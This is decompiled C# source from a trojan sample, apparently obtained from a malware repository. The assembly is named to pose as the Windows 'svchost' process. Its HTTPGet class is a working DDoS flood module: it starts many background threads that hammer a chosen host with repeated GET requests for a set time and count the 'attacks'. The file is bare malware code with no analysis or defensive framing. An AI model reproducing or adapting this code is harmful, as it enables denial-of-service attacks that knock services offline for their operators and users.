// Decompiled with JetBrains decompiler
// Type: svchost.DDOS.HTTPGet
// Assembly: svchost, Version=10.0.18362.1, Culture=neutral, PublicKeyToken=null
// MVID: 64EF29CB-BBE3-43C5-8FBF-9660E67757C5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-b33d569af5e490875d6473c6402797ddb4ce639bb1f1cf7f67698eeafa625f09.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Net;
using System.Threading;

namespace svchost.DDOS
{
  [StandardModule]
  [OptionText]
  public sealed class HTTPGet
  {
    private static object ThreadsEnded = (object) 0;
    private static string HostToAttack;
    private static int TimetoAttack;
    private static int ThreadstoUse;
    private static Thread[] Threads;
    private static bool AttackRunning = false;
    private static int Attacks = 0;

    public static void StartHTTPGet(string Host, int Threadsto, int Time)
    {
      if (HTTPGet.AttackRunning)
        return;
      HTTPGet.AttackRunning = true;
      HTTPGet.HostToAttack = Host;
      HTTPGet.ThreadstoUse = Threadsto;
      HTTPGet.TimetoAttack = Time;
      HTTPGet.Threads = new Thread[checked (Threadsto - 1 + 1)];
      int num = checked (Threadsto - 1);
      int index = 0;
      while (index <= num)
      {
        HTTPGet.Threads[index] = new Thread(new ThreadStart(HTTPGet.DoWork));
        HTTPGet.Threads[index].IsBackground = true;
        HTTPGet.Threads[index].Start();
        checked { ++index; }
      }
    }

    private static void lol()
    {
      HTTPGet.ThreadsEnded = Operators.AddObject(HTTPGet.ThreadsEnded, (object) 1);
      if (!Operators.ConditionalCompareObjectEqual(HTTPGet.ThreadsEnded, (object) HTTPGet.ThreadstoUse, true))
        return;
      HTTPGet.ThreadsEnded = (object) 0;
      HTTPGet.ThreadstoUse = 0;
      HTTPGet.AttackRunning = false;
      HTTPGet.Attacks = 0;
    }

    public static void StopHTTPGET()
    {
      if (!HTTPGet.AttackRunning)
        return;
      int num = checked (HTTPGet.ThreadstoUse - 1);
      int index = 0;
      while (index <= num)
      {
        try
        {
          HTTPGet.Threads[index].Abort();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        checked { ++index; }
      }
      HTTPGet.AttackRunning = false;
      HTTPGet.Attacks = 0;
    }

    private static void DoWork()
    {
      try
      {
        WebClient webClient = new WebClient();
        TimeSpan timeSpan = TimeSpan.FromSeconds((double) HTTPGet.TimetoAttack);
        Stopwatch stopwatch = Stopwatch.StartNew();
        while (stopwatch.Elapsed < timeSpan)
        {
          try
          {
            webClient.DownloadString(HTTPGet.HostToAttack);
            webClient.Dispose();
            checked { ++HTTPGet.Attacks; }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      HTTPGet.lol();
    }
  }
}
